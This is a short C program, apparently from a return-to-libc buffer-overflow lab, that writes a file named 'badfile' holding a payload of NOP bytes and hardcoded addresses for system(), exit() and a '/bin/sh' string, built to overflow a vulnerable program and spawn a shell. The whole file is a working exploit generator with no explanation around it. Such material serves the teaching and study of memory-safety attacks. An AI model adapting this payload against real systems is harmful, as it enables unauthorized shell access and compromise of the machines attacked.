#include <stdlib.h>
#include <stdio.h>
#include <string.h>
int main(int argc, char **argv)
{
 char buf[40];
 FILE *badfile;
 badfile = fopen(".//badfile", "w");

 strcpy(buf, "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90");// nop 24 times

 *(long *) &buf[32] =0xbffffd38; // "//bin//sh"
 *(long *) &buf[24] =0xb7e52310; // system()
 *(long *) &buf[36] =0xb7e45260; // exit()
 fwrite(buf, sizeof(buf), 1, badfile);
 fclose(badfile);
}



